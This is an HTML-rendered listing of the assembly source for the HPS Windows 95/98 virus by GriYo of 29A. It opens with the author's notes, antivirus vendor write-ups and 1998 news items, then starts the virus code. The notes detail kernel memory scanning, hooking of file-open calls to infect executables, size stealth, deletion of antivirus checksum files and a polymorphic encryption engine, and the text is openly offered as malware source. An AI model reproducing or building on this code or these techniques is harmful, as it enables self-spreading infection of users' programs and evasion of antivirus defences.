<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.HPS.5124 - hps.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Hantavirus Pulmonary Syndrome (HPS) Virus BioCoded by GriYo / 29A</span><span class="sc0">
</span><span class="sc1">;   -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Index:</span><span class="sc0">
</span><span class="sc1">;   ------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   1 - About the biological version</span><span class="sc0">
</span><span class="sc1">;   2 - Author's description</span><span class="sc0">
</span><span class="sc1">;   3 - Description from Datafellows</span><span class="sc0">
</span><span class="sc1">;   4 - Description from AVP</span><span class="sc0">
</span><span class="sc1">;   5 - News about HPS from Cable News Network</span><span class="sc0">
</span><span class="sc1">;   6 - News about HPS from InfoWorld Media Group</span><span class="sc0">
</span><span class="sc1">;   7 - HPS source code</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   1 - About the biological version</span><span class="sc0">
</span><span class="sc1">;   --------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The disease  hantavirus pulmonary syndrome (HPS),  is characterized</span><span class="sc0">
</span><span class="sc1">; by an initial  fever followed  by the abrupt onset of acute pulmonary edema</span><span class="sc0">
</span><span class="sc1">; and shock.  After recognition of the initial cases  by observant clinicians</span><span class="sc0">
</span><span class="sc1">; in the Southwest, investigations  were  swiftly mounted by local university</span><span class="sc0">
</span><span class="sc1">; and public health workers but, in spite of efficient and competent studies,</span><span class="sc0">
</span><span class="sc1">; failed to find the cause.  By the time the CDC became involved, a number of</span><span class="sc0">
</span><span class="sc1">; possible  causative  agents  had  been  ruled  out,  leading  most  of  the</span><span class="sc0">
</span><span class="sc1">; investigators  to  believe  they  were  dealing with  a  new  entity.  This </span><span class="sc0">
</span><span class="sc1">; observation  led  to a broadly based approach to the field epidemiology and</span><span class="sc0">
</span><span class="sc1">; the laboratory study of the disease.  Samples from the field investigations </span><span class="sc0">
</span><span class="sc1">; were distributed  among many different  laboratories of the National Center</span><span class="sc0">
</span><span class="sc1">; for  Infectious Disease (NCID) for analysis by  the  most sensitive classic </span><span class="sc0">
</span><span class="sc1">; and  modern  molecular  biological  tests  for  a  wide  range  spectrum of</span><span class="sc0">
</span><span class="sc1">; infectious agents.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Somewhat   surprisingly,   successful    results   were    obtained   after</span><span class="sc0">
</span><span class="sc1">; only  a  few  days  of  straightforward serologic  tests for  hantaviruses.</span><span class="sc0">
</span><span class="sc1">; The hemoconcentration, thrombocytopenia and shock  observed  in some of the</span><span class="sc0">
</span><span class="sc1">; patients  had raised  speculation  about the  involvement  of  these  viral</span><span class="sc0">
</span><span class="sc1">; agents  however they  had been previously  known  as associated  with renal</span><span class="sc0">
</span><span class="sc1">; syndromes only. The  serologic  results  came from  established  techniques</span><span class="sc0">
</span><span class="sc1">; such   as   indirect   fluorescent-antibody    assays   and   enzyme-linked</span><span class="sc0">
</span><span class="sc1">; immunosorbent assays. The  next  steps utilized reverse  transcription  and</span><span class="sc0">
</span><span class="sc1">; PCR  amplification  of  RNA in postmortem tissue  samples (60% of confirmed</span><span class="sc0">
</span><span class="sc1">; cases to date have been fatal), using  consensus  primers  based  on  known</span><span class="sc0">
</span><span class="sc1">; hantavirus RNA sequences. These yielded  products with sequences typical of</span><span class="sc0">
</span><span class="sc1">; hantavirus but  clearly different  from any known member of the genus. This</span><span class="sc0">
</span><span class="sc1">; provided  additional evidence for  the  hantavirus etiology  and linked the</span><span class="sc0">
</span><span class="sc1">; new hantavirus closely  to the human disease by its presence in the tissues</span><span class="sc0">
</span><span class="sc1">; of people dying  of the infection. Using  the  genomic sequences from human</span><span class="sc0">
</span><span class="sc1">; tissues, investigators were  subsequently able to implicate  the deer mouse</span><span class="sc0">
</span><span class="sc1">; as the principle reservoir of the virus.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Hantaviruses  have traditionally  been difficult to propagate, and this one</span><span class="sc0">
</span><span class="sc1">; was no exception. Thus  a full-length  cDNA  clone of the small RNA segment</span><span class="sc0">
</span><span class="sc1">; of the virus was synthesized. This technique provided  a diagnostic reagent</span><span class="sc0">
</span><span class="sc1">; of  increased sensitivity that  could be made widely available. Eventually,</span><span class="sc0">
</span><span class="sc1">; full length  RNA  sequences were  developed  for the  medium  segment and a</span><span class="sc0">
</span><span class="sc1">; partial  sequence  was  determined for the  large  segment, permitting  the</span><span class="sc0">
</span><span class="sc1">; definitive  determination  that the new  virus, isolated  weeks  later  and</span><span class="sc0">
</span><span class="sc1">; registered  as  Muerto Canyon virus, was not  a  reassortant  of  any known</span><span class="sc0">
</span><span class="sc1">; hantavirus.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Immunohistochemical identification  of  hantavirus  antigens  and  in  situ</span><span class="sc0">
</span><span class="sc1">; hybridization   with   genomic  sequences  also  confirmed  the  hantavirus</span><span class="sc0">
</span><span class="sc1">; etiology of the syndrome. The  extensive presence  of  antigen in pulmonary</span><span class="sc0">
</span><span class="sc1">; capillaries provided  an  explanation for the  pathophysiology  and  target</span><span class="sc0">
</span><span class="sc1">; organ  specificity  differing from  that  of  other  known  disease-causing</span><span class="sc0">
</span><span class="sc1">; hantaviruses. This method, when  applied  to paraffin-imbedded tissues, has</span><span class="sc0">
</span><span class="sc1">; also  served as a retrospective diagnostic tool, firmly  identifying  fatal</span><span class="sc0">
</span><span class="sc1">; cases from 10 to 15 years ago.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The rapid  recognition  of  the  hantavirus etiology  of  this  disease was</span><span class="sc0">
</span><span class="sc1">; important in that  it alleviated heightened fear among the general American</span><span class="sc0">
</span><span class="sc1">; population, and saved lives  by focusing public  health  recommendations on</span><span class="sc0">
</span><span class="sc1">; the avoidance  of  contact  with  potentially  infected  rodents. Different</span><span class="sc0">
</span><span class="sc1">; hantaviruses  have  been  isolated in Louisiana, Florida  and  also Brazil,</span><span class="sc0">
</span><span class="sc1">; indicating  the  uncommon, yet widespread nature of this disease. Recently</span><span class="sc0">
</span><span class="sc1">; (Diglisic 1994), isolation  of  a  hantavirus from Mus musculus captured in</span><span class="sc0">
</span><span class="sc1">; Yugoslavia was reported.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; As stated by C.J. Peters, chief  of  the  Special Pathogens Branch  of  the</span><span class="sc0">
</span><span class="sc1">; Division  of  Viral  and  Rickettsial Diseases at NCID, the crucial role of</span><span class="sc0">
</span><span class="sc1">; modern  techniques  in  virology  was  possible  only in  a context of past</span><span class="sc0">
</span><span class="sc1">; hantavirus research, and as part of efforts of a  multidisciplinary team of</span><span class="sc0">
</span><span class="sc1">; clinicians, epidemiologists, field ecologists  and classic microbiologists.</span><span class="sc0">
</span><span class="sc1">; The need for basic research is highlighted by the applied practical success</span><span class="sc0">
</span><span class="sc1">; which  resulted from it, as was  the  case in identifying  a new  strain of</span><span class="sc0">
</span><span class="sc1">; hantavirus.  Future   research  will  need  to  investigate  the  molecular</span><span class="sc0">
</span><span class="sc1">; mechanisms for induction of  pulmonary  edema and  an  appropriate blocking</span><span class="sc0">
</span><span class="sc1">; therapy. The evolutionary  relationships  of  the  hantaviruses  and  their</span><span class="sc0">
</span><span class="sc1">; rodent  host specificity must be understood to predict the future course of</span><span class="sc0">
</span><span class="sc1">; transmission, and  finally  the basis  for  the  different  tropisms of the</span><span class="sc0">
</span><span class="sc1">; viruses must be examined at a molecular level.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   2 - Author's description</span><span class="sc0">
</span><span class="sc1">;   ------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   This virus is a research speciment.  It uses some system hacks that </span><span class="sc0">
</span><span class="sc1">; may not work under futere versions of Windows,  but for the moment it works </span><span class="sc0">
</span><span class="sc1">; nice on Windows95 and Windows98. Some of its characteristics are:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   2.1. Kernel scanning</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The virus traps  GP Faults  and scans system memory looking for the </span><span class="sc0">
</span><span class="sc1">; KERNEL32 base address.  After that if gets the address of VxDCall function.</span><span class="sc0">
</span><span class="sc1">; The virus uses no other APIs at all. </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   2.2. Memory resident</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   By means of  VMM PageReserve  and  PageCommit the virus allocates a</span><span class="sc0">
</span><span class="sc1">; block  of  shared  memory  and  copies  its  body  there.   Then  it  hooks</span><span class="sc0">
</span><span class="sc1">; VWIN32_Int21h_Dispatcher so all opened files will be infected.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   2.3. Stealth</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   HPS  hooks  FindFirst  and  FindNext  functions  in  order  to hide</span><span class="sc0">
</span><span class="sc1">; infected files true size.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   2.4. Retro</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Deletes anti-virus checksum databases.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   2.5. Polymorphic</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The  virus  uses  complex  polymorphic encryption  engine  to  hide</span><span class="sc0">
</span><span class="sc1">; itself into infected files.   This decryptor will be generated during virus</span><span class="sc0">
</span><span class="sc1">; installation (slow mutation).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   2.5. Payload</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   On saturdays the virus  will flip  BMP  files  that  are  accessed,</span><span class="sc0">
</span><span class="sc1">; included the ones hidden on .SYS extension (LOGO.SYS, WLOGO.SYS...).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   3 - Description from Datafellows</span><span class="sc0">
</span><span class="sc1">;   --------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   NAME:  HPS</span><span class="sc0">
</span><span class="sc1">;   ALIAS: Hanta, Win95/HPS</span><span class="sc0">
</span><span class="sc1">;   TYPE:  Resident EXE -files</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   HPS is a polymorphic Windows 95 virus which contains this text:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; &lt; Hantavirus Pulmonary Syndrome (HPS) Virus BioCoded by GriYo / 29A &gt;</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; HPS  stays active in memory  and  infects  Win32  EXE  files  as  they  are</span><span class="sc0">
</span><span class="sc1">; accessed,  encrypting its  own code  with variable  polymorphic  encryption</span><span class="sc0">
</span><span class="sc1">; layer.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; HPS activates on  Saturdays.  If a non-compressed Windows bitmap (BMP) file</span><span class="sc0">
</span><span class="sc1">; has been opened, the virus horizontally flips the picture.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; HPS patches the  value  DEADBABE (in hex) to the  end of the bitmap  header</span><span class="sc0">
</span><span class="sc1">; area to avoid flipping the same image again.   Since  non-compressed bitmap</span><span class="sc0">
</span><span class="sc1">; files are  frequently  used by Windows 95 and 98, this  causes all kinds of</span><span class="sc0">
</span><span class="sc1">; weird effects - such as the start-up and power-down screen of Windows being</span><span class="sc0">
</span><span class="sc1">; "mirrorized". </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   4 - Description from AVP</span><span class="sc0">
</span><span class="sc1">;   ------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   This  5124 bytes  virus is  a  Windows95/98  infector that installs</span><span class="sc0">
</span><span class="sc1">; itself  into  the  Windows  kernel,  hooks system events  and  then affects</span><span class="sc0">
</span><span class="sc1">; Portable Executable (PE) files that are accessed. The virus was named after</span><span class="sc0">
</span><span class="sc1">; its "copyright" string that is visible in decrypted virus code:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; &lt; Hantavirus Pulmonary Syndrome (HPS) Virus BioCoded by GriYo / 29A &gt;</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; While  infecting a file  the virus increases size of last section, encrypts</span><span class="sc0">
</span><span class="sc1">; its code by  polymorphic engine, writes encrypted result to the end of file</span><span class="sc0">
</span><span class="sc1">; into the last section and modifies the address of entry point.  The size of</span><span class="sc0">
</span><span class="sc1">; polymorphic decryption loop is variable, as a result size of infected files</span><span class="sc0">
</span><span class="sc1">; grows by variable values.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus is slow polymorphic, that means  the polymorphic decryption  loop</span><span class="sc0">
</span><span class="sc1">; code is not changed each time the virus infects a file.  Moreover, the same</span><span class="sc0">
</span><span class="sc1">; infected file will produce  the same polymorphic  code while infecting next</span><span class="sc0">
</span><span class="sc1">; files,  and all files that are infected before rebooting will have the same</span><span class="sc0">
</span><span class="sc1">; decryption routine.  Only  next  "generation"  of  the  virus will  produce</span><span class="sc0">
</span><span class="sc1">; polymorphic loop that differs with "parent" copy of the virus.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; When an infected file is executed, the polymorphic decryption routine takes</span><span class="sc0">
</span><span class="sc1">; control, restores virus  code  in  original form and jumps to  installation</span><span class="sc0">
</span><span class="sc1">; routine.  The virus then scans Windows kernel  code to locate  KERNEL32.DLL</span><span class="sc0">
</span><span class="sc1">; image, looks for  export table in there  and gets  VxDCall  routine address</span><span class="sc0">
</span><span class="sc1">; from there.  The virus then uses this address to call disk access and other</span><span class="sc0">
</span><span class="sc1">; routines in case of need.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus then installs itself into the Windows kernel:  allocates  a block</span><span class="sc0">
</span><span class="sc1">; of memory  by  using  undocumented  Win32  VxD  services  provided  by  VMM</span><span class="sc0">
</span><span class="sc1">; (PageReserve and PageCommit), copies  itself  to there, scans  the  VxDCall</span><span class="sc0">
</span><span class="sc1">; handler in KERNEL32 code and patches it with address of its own handler. As</span><span class="sc0">
</span><span class="sc1">; a  result the  virus installs  itself into the shared memory area and hooks</span><span class="sc0">
</span><span class="sc1">; VxDCall.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; To   prevent  General   Protection   while  scanning   Windows  memory  for</span><span class="sc0">
</span><span class="sc1">; KERNEL32.DLL  image  (that can appear  when the virus  accesses  a part  of</span><span class="sc0">
</span><span class="sc1">; memory that is not available for applications) the virus protects itself by</span><span class="sc0">
</span><span class="sc1">; Structured  Exception  Handling (SEH).   This  also  does  its  work  as  a</span><span class="sc0">
</span><span class="sc1">; anti-debugging trick.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus  detects its  already installed copy by a Are-You-Here?  call  by</span><span class="sc0">
</span><span class="sc1">; GetDate  VxDCall with registers  ESI='HPS!'  and  EDI='TSR?', the installed</span><span class="sc0">
</span><span class="sc1">; copy returns 'YES!' in ESI register.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The  virus  VxDCall  handler monitors  VWIN32_Int21Dispatch  calls only and</span><span class="sc0">
</span><span class="sc1">; passes through any other calls. There are nine functions intercepted:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; GetDate, Open ReadOnly, Open WriteOnly, FindFirst/Next with LongNames, </span><span class="sc0">
</span><span class="sc1">; Rename with LongName, Create/Open with LongName.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; On file access calls  (open, rename)  the  virus  compares  the  file  name</span><span class="sc0">
</span><span class="sc1">; extension  with EXE, SRC and SYS and infects them, if they are not infected</span><span class="sc0">
</span><span class="sc1">; yet.   After infecting a  file the virus deletes the  anti-virus data files</span><span class="sc0">
</span><span class="sc1">; ANTI-VIR.DAT, CHKLIST.MS, AVP.CRC, IVB.NTZ, if they exist.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   5 - News about HPS from Cable News Network</span><span class="sc0">
</span><span class="sc1">;   ------------------------------------------</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;   SAN FRANCISCO, CALIFORNIA, U.S.A. (NB)</span><span class="sc0">
</span><span class="sc1">;   By Craig Menefee, Newsbytes.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Panda  Software, a Spanish  security  software firm  that  recently</span><span class="sc0">
</span><span class="sc1">; entered US  anti-virus markets, claims to have bagged  the first Windows 98</span><span class="sc0">
</span><span class="sc1">; computer  virus before  the new operating  system upgrade has even hit  the</span><span class="sc0">
</span><span class="sc1">; shelves.  Panda  says the  bug's  only apparent purpose is to insert itself</span><span class="sc0">
</span><span class="sc1">; into Windows 98 files, wait until Saturdays and then invert the screen to a</span><span class="sc0">
</span><span class="sc1">; mirror image when it activates.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Newsbytes notes several  crucial  authenticating  details were missing late</span><span class="sc0">
</span><span class="sc1">; Wednesday, after the firm's European labs were closed for the day.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Asked  if  the virus is otherwise  damaging, Pedro Bustamante, president of</span><span class="sc0">
</span><span class="sc1">; Panda  Software  USA  in  San Francisco, told  Newsbytes  the  virus  seems</span><span class="sc0">
</span><span class="sc1">; intended more as a nuisance than  a  threat to computer users.  He said the</span><span class="sc0">
</span><span class="sc1">; bug was detected first in Spain and is probably not yet "in the wild," that</span><span class="sc0">
</span><span class="sc1">; is, spread beyond the initial release area.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Panda says the virus is polymorphic  and  encrypted by a scrambling routine</span><span class="sc0">
</span><span class="sc1">; that changes patterns to elude detection.  When unscrambled, it  carries in</span><span class="sc0">
</span><span class="sc1">; its  code  the letters "HPS".   Panda  says  the letters  are  an  apparent</span><span class="sc0">
</span><span class="sc1">; reference  to Hantavirus Pulmonary Syndrome, a viral disease transmitted by</span><span class="sc0">
</span><span class="sc1">; rodents in the US.  Bustamante says the HPS virus also works on  Windows 95</span><span class="sc0">
</span><span class="sc1">; platforms if  Microsoft Internet Explorer 4.0  is installed on the machine.</span><span class="sc0">
</span><span class="sc1">; Still, he adds, the bug  was  designed  specifically  for  Windows 98,  not</span><span class="sc0">
</span><span class="sc1">; MS Internet Explorer 4.0.  Bustamante  told Newsbytes he  will provide some</span><span class="sc0">
</span><span class="sc1">; further answers on  Thursday after the  Panda Software Virus Lab  opens  in</span><span class="sc0">
</span><span class="sc1">; Spain. Questions to be answered include how the researchers know the bug is</span><span class="sc0">
</span><span class="sc1">; targeted for Windows 98 rather than  Windows 95 or MSIE 4.0  as  a bug that</span><span class="sc0">
</span><span class="sc1">; also happens to work under Windows 98.  Also he said he  would find out how</span><span class="sc0">
</span><span class="sc1">; the virus gets transmitted from one machine to another.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   6 - News about HPS from InfoWorld Media Group</span><span class="sc0">
</span><span class="sc1">;   ---------------------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   June 22, 1998 (Vol. 20, Issue 25)</span><span class="sc0">
</span><span class="sc1">;   Virus in Win98 beats OS shipping date</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The first  virus specifically written for  Microsoft Windows 98  is</span><span class="sc0">
</span><span class="sc1">; shipping and available before the operating system itself: Windows 98 ships</span><span class="sc0">
</span><span class="sc1">; June 25.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; HPS (Hantavirus Pulmonary Syndrome) is a  32-bit  polymorphic Windows virus</span><span class="sc0">
</span><span class="sc1">; that only  activates when the infected system is booted on a Saturday.  The</span><span class="sc0">
</span><span class="sc1">; Hantavirus Pulmonary Syndrome for which the virus  is named is a biological</span><span class="sc0">
</span><span class="sc1">; disease  transmitted  by  rodents.   Its  principal  symptom  is  an  acute</span><span class="sc0">
</span><span class="sc1">; respiratory crisis. If activated, the computer virus flips any uncompressed</span><span class="sc0">
</span><span class="sc1">; bitmaps horizontally, only on Saturdays.  This produces a  "mirror"  effect</span><span class="sc0">
</span><span class="sc1">; for many of the screens used within the Windows operating system, according</span><span class="sc0">
</span><span class="sc1">; to  Virus Bulletin, the Oxfordshire, England-based  technical  journal that</span><span class="sc0">
</span><span class="sc1">; tracks viruses.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus was authored by GriYo, who is referred to as a "notorious member"</span><span class="sc0">
</span><span class="sc1">; of the 29A virus-writing group, and is  credited  with writing  the complex</span><span class="sc0">
</span><span class="sc1">; Implant virus, according to Virus Bulletin.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; GriYo did make the virus  backward-compatible, though, so  Windows 95 users</span><span class="sc0">
</span><span class="sc1">; need not upgrade to the new OS to experience the same effects.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Panda Software, based in Spain, has already added protection for this virus</span><span class="sc0">
</span><span class="sc1">; into its anti-virus software.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; According  to a Symantec representative, the company is awaiting its sample</span><span class="sc0">
</span><span class="sc1">; of the virus and said all  anti-virus  companies would be adding protection</span><span class="sc0">
</span><span class="sc1">; for this virus to their libraries shortly.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   7 - HPS source code</span><span class="sc0">
</span><span class="sc1">;   -------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Here is the source code of HPS virus. Refer to the article</span><span class="sc0">
</span><span class="sc1">; "The VxDCall Backdoor" for more information.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; And before anything else, its time for some greetings...</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Maia          Smuaaaack!</span><span class="sc0">
</span><span class="sc1">; Jacky Qwerty  Thanks again for your help on this virus</span><span class="sc0">
</span><span class="sc1">; Vecna         Another great coder on our team... good job man</span><span class="sc0">
</span><span class="sc1">; Reptile       Come this summer with the smurfs (and their houses;)</span><span class="sc0">
</span><span class="sc1">; Picard        What about comming with Reptile this summer?</span><span class="sc0">
</span><span class="sc1">; MrSandman     Esperanto was the dream? or you will bring us another one?</span><span class="sc0">
</span><span class="sc1">; DarkMan       Waiting for that 29A domain ;)</span><span class="sc0">
</span><span class="sc1">; Bozo          Justice? What justice?</span><span class="sc0">
</span><span class="sc1">; Mainboard     Hey listen this song! It sounds like the packets in the net!</span><span class="sc0">
</span><span class="sc1">; DarkNail      Is 'Hasimuri' made with poison?</span><span class="sc0">
</span><span class="sc1">; CaseZero      You have to teach me how to do plastic explosives, eh!?</span><span class="sc0">
</span><span class="sc1">; Amanda        Hiya baby!</span><span class="sc0">
</span><span class="sc1">; Armitage      10x for that Linux includes... remember?</span><span class="sc0">
</span><span class="sc1">; Belize        See yah on da'chanel</span><span class="sc0">
</span><span class="sc1">; DeadRose      I want to see you on next #hack meeting!</span><span class="sc0">
</span><span class="sc1">; Akrata        You have to explain again that 'todo=nada' shit ;)</span><span class="sc0">
</span><span class="sc1">; BillSucks     The 'new world order' man</span><span class="sc0">
</span><span class="sc1">; Psico         Eeeeeoooo!!!</span><span class="sc0">
</span><span class="sc1">; Teddy         Kalgan roqs!</span><span class="sc0">
</span><span class="sc1">; Giggler       You reel? :P</span><span class="sc0">
</span><span class="sc1">; Valkie        What about games? Lets code one! Fuxor!</span><span class="sc0">
</span><span class="sc1">; LuisM         Da'B3st Weba-Masta on this side of the galaxy</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Thats all folks, have fun ;)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  GriYo / 29A</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Im not in the business...</span><span class="sc0">
</span><span class="sc1">; ...I am the business</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; --------&gt;8 cut here ---------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Hantavirus Pulmonary Syndrome (HPS) Virus BioCoded by GriYo / 29A</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc2">.386P</span><span class="sc0">
                </span><span class="sc5">locals</span><span class="sc0">
                </span><span class="sc5">jumps</span><span class="sc0">
                </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">

                </span><span class="sc1">;Include the following files</span><span class="sc0">

                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Win32api.inc</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Useful.inc</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Mz.inc</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Pe.inc</span><span class="sc0">

                </span><span class="sc1">;Some externals only used on 1st generation</span><span class="sc0">

                </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc10">NEAR</span><span class="sc0">
                </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc10">NEAR</span><span class="sc0">

                </span><span class="sc1">;Virus equates</span><span class="sc0">

</span><span class="sc5">mem_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">mem_end</span><span class="sc4">-</span><span class="sc5">mem_base</span><span class="sc0">            </span><span class="sc1">;Size of virus in memory</span><span class="sc0">
</span><span class="sc5">inf_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">inf_end</span><span class="sc4">-</span><span class="sc5">mem_base</span><span class="sc0">            </span><span class="sc1">;Size of virus in files</span><span class="sc0">
</span><span class="sc5">base_default</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00400000h</span><span class="sc0">                   </span><span class="sc1">;Default host base address</span><span class="sc0">
